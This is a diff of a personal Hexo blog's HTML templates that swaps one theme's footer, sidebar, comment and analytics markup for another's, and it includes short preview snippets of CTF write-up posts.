-        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
-        M.toast({html: toastHTML})
-      });
-
-      function navToReprintStatement() {
-        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
-      }
-    </script>
-
-
-
-            <div class="tag_share" style="display: block;">
-                <div class="post-meta__tag-list" style="display: inline-block;">
-                    
-                        <div class="article-tag">
-                            
-                                <a href="/LawlietLW.github.io/tags/pwn/">
-                                    <span class="chip bg-color">pwn</span>
-                                </a>
-                            
-                                <a href="/LawlietLW.github.io/tags/%E5%A0%86/">
-                                    <span class="chip bg-color">堆</span>
-                                </a>
-                            
-                                <a href="/LawlietLW.github.io/tags/fastbin-attack/">
-                                    <span class="chip bg-color">fastbin attack</span>
-                                </a>
-                            
-                                <a href="/LawlietLW.github.io/tags/chunk-extend/">
-                                    <span class="chip bg-color">chunk extend</span>
-                                </a>
-                            
-                        </div>
-                    
-                </div>
-                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
-                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
-
-<div id="article-share">
-    
-    
-    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
-    <script src="/libs/share/js/social-share.min.js"></script>
-    
-
-    
-
+    <div class="page-nav-prev page-nav-item">
+      
+      <a href="/LawlietLW.github.io/2020/02/09/hack-world/" rel="prev" title="Hack World"><span class="nav-title">Hack World</span><i class="fas fa-angle-right"></i></a>
+      
+    </div>
+  </nav>
+  
+  
 </div>
 
-                </div>
-            </div>
-            
+          </div>
+          
+          
+          
+<aside class="sidebar" id="sidebar" style="background: url(/LawlietLW.github.io/images/background.png);">
+  
+  <div class="search">
+    <div class="form-group">
+      <i class="fas fa-search"></i><input type="search" id="search-input" name="q" results="0" placeholder="Search" class="form-control"/>
+    </div>
+  </div>
+  <div class="search-result-box" id="search-result"></div>
+  
+  
+<div class="info sidebar-item" id="info">
+  
+  <h1 class="author-name">Lock</h1>
+  <h2 class="author-description"></h2>
+  <div class="site-count">
+    
+  </div>
+  
+  <div class="rss">
+    <a class="rss-link button sidebar-item" href="/LawlietLW.github.io/atom.xml"><i class="fas fa-rss"></i>RSS</a>
+  </div>
+  
+</div>
+
+
+  <div class="sidebar-sticky">
+    
+    
+    
+    
+    
+    
+    
+    
+  </div>
+</aside>
+
+
+          
         </div>
+      </div>
+    </main>
+    
+<footer id="footer" class="footer">
+  <div class="container">
+    <div class="back-to-top">
+      <button id="back-to-top"><i class="fas fa-angle-double-up" aria-label="Back to Top"></i></button>
     </div>
-
-    
-        <link rel="stylesheet" href="/libs/gitalk/gitalk.css">
-<link rel="stylesheet" href="/css/my-gitalk.css">
-
-<div class="card gitalk-card" data-aos="fade-up">
-    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; left: 20px; top: 15px; padding-bottom: 5px;">
-        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
-        <span>评论</span>
-    </div>
-    <div id="gitalk-container" class="card-content"></div>
-</div>
-
-<script src="/libs/gitalk/gitalk.min.js"></script>
-<script>
-    let gitalk = new Gitalk({
-        clientID: '',
-        clientSecret: '',
-        repo: '',
-        owner: '',
-        admin: null,
-        id: '2020-02-01T10-17-37',
-        distractionFreeMode: false  // Facebook-like distraction free mode
-    });
-
-    gitalk.render('gitalk-container');
-</script>
-    
-
-    
-
-    
-
-    
-
-    
-
-    
-
-<article id="prenext-posts" class="prev-next articles">
-    <div class="row article-row">
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
-            <div class="card">
-                <a href="/LawlietLW.github.io/2020/02/09/hack-world/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/bizhi/3.jpg" class="responsive-img" alt="Hack World">
-                        
-                        <span class="card-title">Hack World</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            打开环境，很明显就是sql注入输入几个数字测试一下3以后就没有不同的回显了接着测试单引号，输入1’测试回显bool(false)看到bool自然就想到bool盲注，不过我们还得fuzz一下过滤了哪些关键字，直接上bp测试长度为472的都是b
-                        
-                    </div>
-                    <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-02-09
-                        </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/LawlietLW.github.io/categories/CTF/" class="post-category">
-                                    CTF
-                                </a>
-                            
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/LawlietLW.github.io/tags/web/">
-                        <span class="chip bg-color">web</span>
-                    </a>
-                    
-                    <a href="/LawlietLW.github.io/tags/sql%E6%B3%A8%E5%85%A5/">
-                        <span class="chip bg-color">sql注入</span>
-                    </a>
-                    
-                    <a href="/LawlietLW.github.io/tags/bool%E7%9B%B2%E6%B3%A8/">
-                        <span class="chip bg-color">bool盲注</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
+    <div class="footer-container">
+      <div class="footer-left">
+        <div class="copyright">
+          <span class="author">Lock</span><span class="year"><i class="far fa-copyright"></i>2020</span>
         </div>
         
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/LawlietLW.github.io/2020/01/30/buuctf-pwn1-sctf-2016/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/bizhi/8.jpg" class="responsive-img" alt="BUUCTF pwn1_sctf_2016">
-                        
-                        <span class="card-title">BUUCTF pwn1_sctf_2016</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            checksec32位程序，开启栈不可执行IDA分析，vuln函数和后门函数
-vuln函数看起来很大一坨，实际上都是C++的一些东西，函数的真正意思其实就是把I替换成you执行程序试一试如我们所想一样再看向缓冲区gets允许输入32个字节，
-                        
-                    </div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-01-30
-                            </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/LawlietLW.github.io/categories/CTF/" class="post-category">
-                                    CTF
-                                </a>
-                            
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/LawlietLW.github.io/tags/pwn/">
-                        <span class="chip bg-color">pwn</span>
-                    </a>
-                    
-                    <a href="/LawlietLW.github.io/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/">
-                        <span class="chip bg-color">栈溢出</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
+      </div>
+      <div class="footer-right">
+        <div class="custom-info">
+          
         </div>
-        
-    </div>
-</article>
-
-</div>
-
-
-
-<!-- 代码块功能依赖 -->
-<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
-
-<!-- 代码语言 -->
-
-<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
-
-
-<!-- 代码块复制 -->
-
-<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
-
-
-<!-- 代码块收缩 -->
-
-<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
-
-
-<!-- 代码块折行 -->
-
-<style type="text/css">
-code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
-</style>
-
-
-    </div>
-    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
-        <div class="toc-widget">
-            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
-            <div id="toc-content"></div>
+        <div class="powered-by">
+          Proudly Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> | Theme is <a href="https://github.com/AlynxZhou/hexo-theme-aria/" target="_blank">ARIA</a>
         </div>
+      </div>
     </div>
-</div>
-
-<!-- TOC 悬浮按钮. -->
-
-<div id="floating-toc-btn" class="hide-on-med-and-down">
-    <a class="btn-floating btn-large bg-color">
-        <i class="fas fa-list-ul"></i>
-    </a>
-</div>
-
-
-<script src="/libs/tocbot/tocbot.min.js"></script>
-<script>
-    $(function () {
-        tocbot.init({
-            tocSelector: '#toc-content',
-            contentSelector: '#articleContent',
-            headingsOffset: -($(window).height() * 0.4 - 45),
-            collapseDepth: Number('2'),
-            headingSelector: 'h2, h3, h4'
-        });
-
-        // modify the toc link href to support Chinese.
-        let i = 0;
-        let tocHeading = 'toc-heading-';
-        $('#toc-content a').each(function () {
-            $(this).attr('href', '#' + tocHeading + (++i));
-        });
-
-        // modify the heading title id to support Chinese.
-        i = 0;
-        $('#articleContent').children('h2, h3, h4').each(function () {
-            $(this).attr('id', tocHeading + (++i));
-        });
-
-        // Set scroll toc fixed.
-        let tocHeight = parseInt($(window).height() * 0.4 - 64);
-        let $tocWidget = $('.toc-widget');
-        $(window).scroll(function () {
-            let scroll = $(window).scrollTop();
-            /* add post toc fixed. */
-            if (scroll > tocHeight) {
-                $tocWidget.addClass('toc-fixed');
-            } else {
-                $tocWidget.removeClass('toc-fixed');
-            }
-        });
-
-        
-        /* 修复文章卡片 div 的宽度. */
-        let fixPostCardWidth = function (srcId, targetId) {
-            let srcDiv = $('#' + srcId);
-            if (srcDiv.length === 0) {
-                return;
-            }
-
-            let w = srcDiv.width();
-            if (w >= 450) {
-                w = w + 21;
-            } else if (w >= 350 && w < 450) {
-                w = w + 18;
-            } else if (w >= 300 && w < 350) {
-                w = w + 16;
-            } else {
-                w = w + 14;
-            }
-            $('#' + targetId).width(w);
-        };
-
-        // 切换TOC目录展开收缩的相关操作.
-        const expandedClass = 'expanded';
-        let $tocAside = $('#toc-aside');
-        let $mainContent = $('#main-content');
-        $('#floating-toc-btn .btn-floating').click(function () {
-            if ($tocAside.hasClass(expandedClass)) {
-                $tocAside.removeClass(expandedClass).hide();
-                $mainContent.removeClass('l9');
-            } else {
-                $tocAside.addClass(expandedClass).show();
-                $mainContent.addClass('l9');
-            }
-            fixPostCardWidth('artDetail', 'prenext-posts');
-        });
-        
-    });
-</script>
-
-    
-
-</main>
-
-
-
-    <footer class="page-footer bg-color">
-    <div class="container row center-align" style="margin-bottom: 0px !important;">
-        <div class="col s12 m8 l8 copy-right">
-            Copyright&nbsp;&copy;
-            <span id="year">2019</span>
-            <a href="http://LawlietLW.github.io" target="_blank">LawlietLW</a>
-            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
-            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
-            <br>
-            
-            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">16.5k</span>&nbsp;字
-            
-            
-            
-            
-            
-            
-            <span id="busuanzi_container_site_pv">
-                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
-                    class="white-color"></span>&nbsp;次
-            </span>
-            
-            
-            <span id="busuanzi_container_site_uv">
-                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
-                    class="white-color"></span>&nbsp;人
-            </span>
-            
-            <br>
-            
-            <br>
-            
-        </div>
-        <div class="col s12 m4 l4 social-link social-statis">
-
-
-    <a href="mailto:2499086884@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
-        <i class="fas fa-envelope-open"></i>
-    </a>
-
-
-
-
-
-
-
-    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=2499086884" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 2499086884" data-position="top" data-delay="50">
-        <i class="fab fa-qq"></i>
-    </a>
-
-
-
-
-
-
-
-    <a href="/LawlietLW.github.io/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
-        <i class="fas fa-rss"></i>
-    </a>
-
-</div>
-    </div>
+  </div>
 </footer>
 
-<div class="progress-bar"></div>
 
-
-    <!-- 搜索遮罩框 -->
-<div id="searchModal" class="modal">
-    <div class="modal-content">
-        <div class="search-header">
-            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
-            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
-                   class="search-input">
-        </div>
-        <div id="searchResult"></div>
-    </div>
-</div>
-
-<script src="/js/search.js"></script>
-<script type="text/javascript">
-$(function () {
-    searchFunc("/LawlietLW.github.io/" + "search.xml", 'searchInput', 'searchResult');
-});
-</script>
-    <!-- 回到顶部按钮 -->
-<div id="backTop" class="top-scroll">
-    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
-        <i class="fas fa-arrow-up"></i>
-    </a>
-</div>
-
-
-    <script src="/libs/materialize/materialize.min.js"></script>
-    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
-    <script src="/libs/aos/aos.js"></script>
-    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
-    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
-    <script src="/js/matery.js"></script>
-
-    <!-- Global site tag (gtag.js) - Google Analytics -->
-
-<script async src="https://www.googletagmanager.com/gtag/js?id="></script>
-<script>
-    window.dataLayer = window.dataLayer || [];
-    function gtag() {
-        dataLayer.push(arguments);
-    }
-
-    gtag('js', new Date());
-    gtag('config', '');
-</script>
-
-
-    <!-- Baidu Analytics -->
-
-<script>
-    var _hmt = _hmt || [];
-    (function () {
-        var hm = document.createElement("script");
-        hm.src = "https://hm.baidu.com/hm.js?";
-        var s = document.getElementsByTagName("script")[0];
-        s.parentNode.insertBefore(hm, s);
-    })();
-</script>
-
-    <!-- Baidu Push -->
-
-<script>
-    (function () {
-        var bp = document.createElement('script');
-        var curProtocol = window.location.protocol.split(':')[0];
-        if (curProtocol === 'https') {
-            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
-        } else {
-            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
-        }
-        var s = document.getElementsByTagName("script")[0];
-        s.parentNode.insertBefore(bp, s);
-    })();
-</script>
-
-    
-    <script src="/libs/others/clicklove.js" async="async"></script>
-    
-    
-    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
-    
-
-    
-
-    
-
-    
-
-    
-
-    
-    
-    
-    <script src="/libs/instantpage/instantpage.js" type="module"></script>
-    
-
-</body>
-
+  </body>
 </html>
